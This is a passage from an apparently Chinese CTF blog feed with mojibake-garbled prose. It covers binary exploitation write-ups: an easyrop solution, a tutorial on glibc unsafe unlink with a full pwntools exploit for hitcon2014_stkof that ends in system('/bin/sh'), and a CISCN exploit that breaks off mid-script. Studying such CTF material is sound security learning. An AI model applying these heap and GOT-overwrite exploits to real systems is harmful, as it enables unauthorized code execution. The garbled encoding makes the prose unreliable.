<p>è¿™è¾¹æœ‰ä¸ªæ³¨æ„ç‚¹ï¼šè¦†ç›–æˆåŠŸåé€€å‡ºç¨‹åºæ—¶ï¼Œç¨‹åºè¿˜æ˜¯ä¼šæ‰§è¡Œåˆ°æ•°ç»„è¶Šç•Œçš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™æ—¶å€™çš„è¾“å…¥åªèƒ½æ˜¯è¾“å…¥ä¸€ä¸ªâ€™\x00â€™ï¼Œå¹¶ä¸”ä¸èƒ½å«æœ‰æ¢è¡Œç¬¦ï¼Œå¦åˆ™ä¼šæ¥åœ¨å‰é¢è¾“å…¥çš„åé—¨å‡½æ•°çš„åœ°å€ä¸Šï¼Œå¯¼è‡´åœ°å€æ— æ•ˆäº†</p>
<p>åœ¨æœ¬åœ°æˆåŠŸgetshellï¼Œè¿œç¨‹çš„dockerå¯èƒ½å‡ºé—®é¢˜äº†ï¼Œæ²¡æœ‰ååº”</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812184240747.png" alt="image-20210812184240747"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸å®‰å…¨çš„unlink</title>
    <url>/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</url>
    <content><![CDATA[<p>ä»¥ä¸‹çŸ¥è¯†æ‘˜è‡ªã€ŠCTFç«èµ›æƒå¨æŒ‡å— Pwnç¯‡ã€‹ã€CTF-Wiki</p>
<h1 id="ä¸å®‰å…¨çš„unlike"><a href="#ä¸å®‰å…¨çš„unlike" class="headerlink" title="ä¸å®‰å…¨çš„unlike"></a>ä¸å®‰å…¨çš„unlike</h1><h2 id="ä»€ä¹ˆå«unlike"><a href="#ä»€ä¹ˆå«unlike" class="headerlink" title="ä»€ä¹ˆå«unlike"></a>ä»€ä¹ˆå«unlike</h2><p>ä¸ºäº†é¿å…å †å†…å­˜çš„è¿‡åº¦ç¢ç‰‡åŒ–ï¼Œå½“ä¸€ä¸ªå †å—ï¼ˆéfastbin chunkï¼‰è¢«é‡Šæ”¾æ—¶ï¼Œlibcä¼šæŸ¥çœ‹å…¶å‰åå †å—æ˜¯å¦å¤„äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å‰é¢æˆ–åé¢çš„å †å—ä»binsé“¾å–å‡ºæ¥ï¼Œä¸å½“å‰é‡Šæ”¾å †å—åˆå¹¶ï¼Œè¿™ä¸ªå–å‡ºå †å—çš„è¿‡ç¨‹å°±å«åšunlike</p>
<p>åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p>
<p>ä¸Šè¿°çš„æ“ä½œè¿›è¡Œäº†å¦‚ä¸‹çš„èµ‹å€¼</p>
<ul>
<li><p>*( fd + 0x18 ) = bk</p>
</li>
<li><p>*( bk + 0x10 ) = fd</p>
</li>
</ul>
<h3 id="unlinkä¸­çš„æ£€æŸ¥"><a href="#unlinkä¸­çš„æ£€æŸ¥" class="headerlink" title="unlinkä¸­çš„æ£€æŸ¥"></a>unlinkä¸­çš„æ£€æŸ¥</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨unlink"><a href="#åˆ©ç”¨unlink" class="headerlink" title="åˆ©ç”¨unlink"></a>åˆ©ç”¨unlink</h2><p>è¦åˆ©ç”¨unlinké¦–å…ˆè¦ç»•è¿‡ä¸Šé¢æåˆ°çš„ä¸¤ä¸ªæ£€æŸ¥ï¼š</p>
<ol>
<li><p>sizeæ£€æŸ¥ï¼š</p>
<p>åœ¨å †ä¸­æœ‰ä¸¤ä¸ªåœ°æ–¹å­˜å‚¨äº†Pçš„sizeï¼šç¬¬ä¸€ä¸ªæ˜¯å½“å‰P-&gt;sizeï¼Œç¬¬äºŒä¸ªæ˜¯next_chunk-&gt;prev_sizeï¼Œæ¯”è¾ƒä¸¤è€…å¤§å°</p>
</li>
<li><p>fdå’Œbkæ£€æŸ¥ï¼š</p>
<p>æ£€æŸ¥Pæ˜¯å¦åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œåœ¨åŒå‘é“¾è¡¨ä¸­æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘Pï¼šç¬¬ä¸€ä¸ªæ˜¯FD-&gt;bkï¼Œç¬¬äºŒä¸ªæ˜¯BK-&gt;fd</p>
</li>
</ol>
<p>åœ¨libc-2.27.soç‰ˆæœ¬ï¼Œè¦å…ˆå¡«æ»¡tcache bin</p>
<h3 id="ç¬¬ä¸€ç§æ€è·¯"><a href="#ç¬¬ä¸€ç§æ€è·¯" class="headerlink" title="ç¬¬ä¸€ç§æ€è·¯"></a>ç¬¬ä¸€ç§æ€è·¯</h3><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol>
<li>å­˜åœ¨UAFå¯ä»¥ä¿®æ”¹Pçš„fdå’Œbk</li>
<li>å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘P</li>
</ol>
<h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><ol>
<li>é€šè¿‡UAFæ¼æ´ä¿®æ”¹chunk0-&gt;fd=G_ptr-0x18ï¼Œchunk0-&gt;bk=G_ptr-0x10ï¼Œç»•è¿‡fdå’Œbkæ£€æŸ¥</li>
<li>freeä¸‹ä¸€ä¸ªchunkï¼Œchunk0å’Œchunk1åˆå¹¶ï¼Œchunk0å‘ç”Ÿunlinkï¼Œä¿®æ”¹äº†G_ptrçš„å€¼</li>
</ol>
<h4 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p>ä¿®æ”¹G_ptr=&amp;G_ptr-0x18ã€‚å¦‚æœèƒ½å¤Ÿå¯¹G_ptræŒ‡å‘çš„ç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä»»æ„åœ°å€è¯»å†™ã€‚</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="ç¬¬äºŒç§æ€è·¯"><a href="#ç¬¬äºŒç§æ€è·¯" class="headerlink" title="ç¬¬äºŒç§æ€è·¯"></a>ç¬¬äºŒç§æ€è·¯</h3><h4 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol>
<li>å¯ä»¥ä¿®æ”¹pçš„ä¸‹ä¸€ä¸ªchunk-&gt;pre_sizeå’Œinuseä½</li>
<li>å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘chunk pçš„å†…å®¹éƒ¨åˆ†</li>
</ol>
<h4 id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><ol>
<li><p>ä¼ªé€ fake_chunkï¼šfakechunk-&gt;size=chunk0-0x10ï¼Œå¯ä»¥ç»•è¿‡sizeæ£€æŸ¥</p>
<p>fakechunk-&gt;fd=&amp;G_ptr-0x18ï¼Œfakechunk-&gt;bk = &amp;G_ptr-&gt;0x10ï¼Œç»•è¿‡fdå’Œbkæ£€æŸ¥</p>
</li>
<li><p>ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_size=chunksize-0x10ã€‚å› ä¸ºfakechunkæ¯”chunk0å°0x10</p>
</li>
<li><p>ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„inuseä½</p>
</li>
<li><p>freeä¸‹ä¸€ä¸ªå †å—chunk1ã€‚fake chunkå’Œchunk1åˆå¹¶ï¼Œfake chunkå‘ç”Ÿunlinkï¼Œä¿®æ”¹äº†G_ptrçš„å€¼</p>
</li>
</ol>
<h4 id="æ•ˆæœ-1"><a href="#æ•ˆæœ-1" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p>ä¿®æ”¹G_ptr=&amp;G_ptr-0x18ã€‚å¦‚æœèƒ½å¤Ÿå¯¹G_ptræŒ‡å‘çš„ç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä»»æ„åœ°å€è¯»å†™</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¾‹é¢˜hitcon2014-stkof"><a href="#ä¾‹é¢˜hitcon2014-stkof" class="headerlink" title="ä¾‹é¢˜hitcon2014_stkof"></a>ä¾‹é¢˜hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png" alt="image-20210831204845498"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€äº†NXã€Canary</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png" alt="image-20210831211106261"></p>
<p>è¿›å…¥IDAï¼Œé¢ï¼Œæœ‰ä¸ªé€‰é¡¹ä¸º4çš„åŠŸèƒ½ä¼¼ä¹å¹¶æ²¡æœ‰ä½œç”¨ï¼Œç„¶åæº¢å‡ºç‚¹å­˜åœ¨ä¸ä¿®æ”¹å‡½æ•°ä¸­ï¼Œå¯¹äºæˆ‘ä»¬èƒ½ä¿®æ”¹çš„é•¿åº¦æ˜¯ä¸å­˜åœ¨ä»€ä¹ˆé™åˆ¶çš„ï¼Œæ‰€ä»¥èƒ½å¾ˆè½»æ˜“çš„é€ æˆå †æº¢å‡º</p>
<p>é¢˜ç›®æ²¡å¼€PIEï¼Œæ‰€ä»¥å †ç»“æ„çš„åœ°å€æ˜¯å·²çŸ¥çš„ï¼Œæ•´ä¸ªç¨‹åºä¸å­˜åœ¨æ‰“å°åŠŸèƒ½ã€‚è¿™è¾¹çš„æ€è·¯æ˜¯ï¼š</p>
<p>å…ˆé€šè¿‡unlinkæŠŠå †ç»“æ„ä¸Šçš„å †æŒ‡é’ˆæ”¹ä¸ºåœ¨å †ç»“æ„å‰çš„åœ°å€ï¼Œä»è€Œå¯ä»¥æ§åˆ¶å †ç»“æ„ï¼Œè¾¾æˆä»»æ„å†™ï¼›ç„¶åå…ˆä¿®æ”¹ <code>s[1] = free@got</code> åœ°å€ï¼ŒåŒæ—¶ä¿®æ”¹ <code>s[2] = puts@got</code> åœ°å€ï¼›å†ä¸€æ¬¡ç¼–è¾‘ï¼Œå®ç°è¦†å†™free@gotä¸ºputs@plt,ä»è€Œå½“è°ƒç”¨ free å‡½æ•°æ—¶ï¼Œå³å¯ç›´æ¥è°ƒç”¨ puts å‡½æ•°ã€‚è¿™æ ·å°±å¯ä»¥æ³„æ¼å‡½æ•°å†…å®¹ã€‚ç„¶åfree(s[2])ï¼Œç›¸å½“äºæ‰§è¡Œäº†putsï¼ˆputs@gotï¼‰é€šè¿‡putsæ³„éœ²puts@gotçš„å€¼ï¼Œè·å¾—libcåŸºåœ°å€ï¼Œç„¶åå°±å¯ä»¥è·å¾—systemï¼›æœ€åä¿®æ”¹å†æŠŠfree@gotä¿®æ”¹ä¸ºsystemï¼Œå¯¹ç€å†™æœ‰/bin/sh\x00çš„å †å—é‡Šæ”¾</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png" alt="image-20210831213326412"></p>
<p>é¦–å…ˆï¼Œè¿™è¾¹ç¬¬ä¸€ä¸ªç”³è¯·çš„chunkæ˜¯ä¸èƒ½è¢«ä½¿ç”¨çš„ï¼Œç”±äºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setvbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‰é¢å…ˆåˆ†é…ä¸€ä¸ª chunk æ¥æŠŠç¼“å†²åŒºåˆ†é…å®Œæ¯•ï¼Œä»¥å…å½±å“ä¹‹åçš„æ“ä½œã€‚å…·ä½“çš„çœ‹ctfwikiè¿™é¢˜çš„<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO ç¼“å†²åŒºé—®é¢˜åˆ†æ</a>ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªå †å—ä¸èƒ½ç”¨æ¥åšfakechunk</p>
<p>æ‰€ä»¥è¿™è¾¹è¿›è¡Œåˆ›é€ fake_chunkè¦æ³¨æ„ï¼é¦–å…ˆï¼Œå †å—çš„ç´¢å¼•ä»1å¼€å§‹ï¼›å…¶æ¬¡ç¬¬ä¸€ä¸ªä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä»å †ç»“æ„çš„ç¬¬äºŒä¸ªåœ°æ–¹ä½œä¸ºåœ°å€</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png" alt="image-20210831214046823"></p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png" alt="image-20210831214232302"></p>
<p>è§¦å‘unlinkï¼Œé€ æˆåˆå¹¶ï¼ŒåŒæ—¶å †ç»“æ„æŒ‡é’ˆçš„å€¼è¢«æ”¹ä¸ºå…¶åœ°å€ - 0x18</p>
<p>ç„¶åå°±æ˜¯æŒ‰ç…§æ€è·¯æ‰€è¯´çš„ï¼Œå»ä¿®æ”¹å †ç»“æ„å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 é˜²æ­¢åˆå¹¶</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size  size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="æ–°ç‰ˆæœ¬ä¸‹çš„unlink"><a href="#æ–°ç‰ˆæœ¬ä¸‹çš„unlink" class="headerlink" title="æ–°ç‰ˆæœ¬ä¸‹çš„unlink"></a>æ–°ç‰ˆæœ¬ä¸‹çš„unlink</h2><p>åœ¨ glibc2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œglibc åœ¨ unlink å†…åŠ å…¥äº† prevsize checkã€‚å½“ç„¶è¿™ä¸ªæ£€æµ‹å¯¹äºä¸Šé¢çš„unlinkæ”»å‡»æ˜¯æ²¡æœ‰å½±å“çš„ï¼Œå½±å“çš„æ˜¯offbynullçš„æ”»å‡»åˆ©ç”¨ï¼Œä¸èƒ½ç›´æ¥é€šè¿‡ä¿®æ”¹sizeæ¥åˆ¶é€ å †å—é‡å ã€‚ä¸‹é¢æ˜¯æ–°çš„æ£€æµ‹æœºåˆ¶æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…·ä½“å…³äºoffbynullå¸¦æ¥çš„å½±å“ï¼Œå¯ä»¥ç§»æ­¥æˆ‘çš„å¦ä¸€ç¯‡åšå®¢offbyone&amp;null</p>
]]></content>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn</title>
    <url>/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/</url>
    <content><![CDATA[<h3 id="ä¸€ã€pwny"><a href="#ä¸€ã€pwny" class="headerlink" title="ä¸€ã€pwny"></a>ä¸€ã€pwny</h3><p>å…ˆchecksecä¸€ä¸‹</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/4.png"></p>
<p>ä¿æŠ¤å…¨å¼€äº†ï¼Œè¿›å…¥idaçœ‹çœ‹ä»£ç ã€‚</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523174951.png"></p>
<p>ä¸‰ä¸ªåŠŸèƒ½ï¼Œä¸»è¦çœ‹readå’Œwriteä¸¤ä¸ªï¼Œå…¶æ¬¡æ³¨æ„åœ¨å¾ªç¯çš„é¡¶ä¸Šæœ‰ä¸ªå‡½æ•°ã€‚</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175036.png"></p>
<p>è¿™é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªå®šä¹‰çš„å˜é‡ï¼Œå­˜æ”¾äº†éšæœºæ•°çš„æ–‡å­—æè¿°ç¬¦ã€‚è¿™é‡Œçš„å˜é‡ä½œä¸ºåé¢ä¸¤ä¸ªåŠŸèƒ½é‡Œé¢çš„readçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ— æ³•è¾“å…¥æ•°æ®çš„ã€‚</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175133.png"></p>
<p>è¿›å…¥writeå‡½æ•°ï¼Œè¿™é‡Œæ•°ç»„å­˜åœ¨è¶Šç•Œï¼Œå¯ä»¥é€šè¿‡è¿™é‡Œä¿®æ”¹ä¸¤æ¬¡ï¼ŒæŠŠä¹‹å‰é‚£ä¸ªå˜é‡ä¿®æ”¹ä¸º0ã€‚è¿™é‡Œæ˜¯è¿™ä¹ˆç†è§£çš„ï¼šç¬¬ä¸€æ¬¡ä¿®æ”¹ï¼Œæ˜¯æŠŠéšæœºæ•°é‡Œé¢çš„ä¸€ä¸ªæ•°æ®æ›¿æ¢æ–‡å­—æè¿°ç¬¦ï¼Œç„¶ååœ¨æ¥ä¸€æ¬¡ï¼Œç”±äºè¿™ä¸ªéšæœºæ•°ä¸ä¼šå¯¹åº”ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥readä¸æ‰§è¡Œï¼Œv2ä»ç„¶æ˜¯0ï¼Œå°±æˆåŠŸä¿®æ”¹äº†ã€‚å› ä¸ºè¿™é¢˜å¼€å¯äº†PIEåŠ ä¸Šæœ¬å°±æœ‰çš„ASLRï¼Œæˆ‘ä»¬è¦æ³„éœ²çš„åœ°å€æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯PIEï¼Œå¦ä¸€ä¸ªæ˜¯libc</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181332.png"></p>
<p>åœ¨readåŠŸèƒ½é‡Œé¢æœ‰ä¸ª__print_chkï¼Œåœ¨æ±‡ç¼–ä»£ç å¯ä»¥çœ‹è§ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å¯ä»¥è¢«æ ˆé¡¶çš„å†…å®¹å½±å“ï¼Œè€Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥çš„ï¼Œæ‰€ä»¥ç»§ç»­æ•°ç»„è¶Šç•Œ</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181504.png"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181627.png"></p>
<p>åˆ†åˆ«æ³„éœ²å‡º.bssæ®µä¸Šçš„stdrr,ä»¥åŠdataé‡Œé¢å­˜åœ¨ä¸€ä¸ªè¯¥åœ°å€çš„åç§»ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ–¹å‘æ˜¯å¯¹äº†ï¼Œä¸»é¢˜äººç»™çš„æ¡ä»¶ã€‚</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/1.png"></p>
<p>è¿™æ˜¯è®¡ç®—æ³„éœ²å‡ºçš„åœ°å€è·ç¦»libc_baseçš„åç§»</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/3.png"></p>
<p>æœ€ååŠ«æŒexit_hookä¸ºsystemï¼Œå¹¶ä¸”æ‰¾åˆ°exitå¯¹åº”çš„å‚æ•°ä½ç½®ï¼Œå°†å…¶ä¿®æ”¹ä¸ºâ€/bin/sh\x00â€ã€‚å¤§ä½¬çš„æ€ç»´æ˜¯çœŸæ»´å¼ºï¼è†œæ‹œï¼</p>
<p>exp1ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc =ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 